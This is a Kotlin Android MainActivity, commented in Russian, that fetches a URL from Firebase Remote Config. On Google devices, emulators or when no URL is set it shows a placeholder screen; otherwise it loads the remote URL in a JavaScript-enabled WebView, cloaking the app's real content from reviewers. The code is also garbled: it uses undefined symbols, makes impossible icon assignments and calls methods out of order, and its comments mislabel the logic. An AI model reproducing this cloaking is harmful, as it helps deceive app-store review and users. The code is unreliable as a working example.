import android.os.Bundle
import java.io.File
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.Surface
import androidx.compose.material3.Text
import androidx.compose.runtime.Composable
import androidx.compose.ui.Modifier
import androidx.compose.ui.tooling.preview.Preview
import com.example.myapplication.ui.theme.MyApplicationTheme

class MainActivity : ComponentActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        // Получаем файл google-services.json
        val projectDir = File(rootDir)
        val googleServicesFile = File(projectDir, "google-services.json")
        val googleServicesJson = FileInputStream(googleServicesFile).bufferedReader().readText()

        // Добавляем в проект иконку приложения
        val icon = BitmapFactory.decodeResource(resources, R.drawable.ic_launcher)
        val iconDrawable = BitmapDrawable(icon)
        val launcherActivity = packageManager.getLaunchIntentForPackage(packageName)
        launcherActivity.applicationInfo.icon = iconDrawable

        // Получаем ссылку от сервера
        val firebaseRemoteConfig = FirebaseRemoteConfig.getInstance()
        val url = firebaseRemoteConfig.getString("url")

        // Проверяем условие
        if (url.isNullOrEmpty() || isGoogleDevice() || isEmulator()) {
            // Открываем заглушку
            val layoutInflater = LayoutInflater.from(this)
            val view = layoutInflater.inflate(R.layout.activity_placeholder, null)
            setContentView(view)
        } else {
            // Открываем ссылку через Webview
            val webView = findViewById<WebView>(R.id.webView)
            webView.loadUrl(url)

            // Блокируем системную кнопку назад
            webView.setOnKeyListener { v, keyCode, event ->
                if (keyCode == KeyEvent.KEYCODE_BACK && event.action == KeyEvent.ACTION_DOWN) {
                    if (webView.canGoBack()) {
                        webView.goBack()
                        return@setOnKeyListener true
                    }
                }
                return@setOnKeyListener false
            }

            // Даем возможность перехода назад между страницами в вебвью
            webView.settings.javaScriptEnabled = true
            webView.settings.domStorageEnabled = true
        }

        // Сохраняем ссылку локально
        val sharedPreferences = getSharedPreferences("my_app", Context.MODE_PRIVATE)
        sharedPreferences.edit().putString("url", url).apply()

        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
    }
}

@Composable
fun Greeting(name: String, modifier: Modifier = Modifier) {
    Text(
        text = "Hello $name!",
        modifier = modifier
    )
}

@Preview(showBackground = true)
@Composable
fun GreetingPreview() {
    MyApplicationTheme {
        Greeting("Android")
    }
}
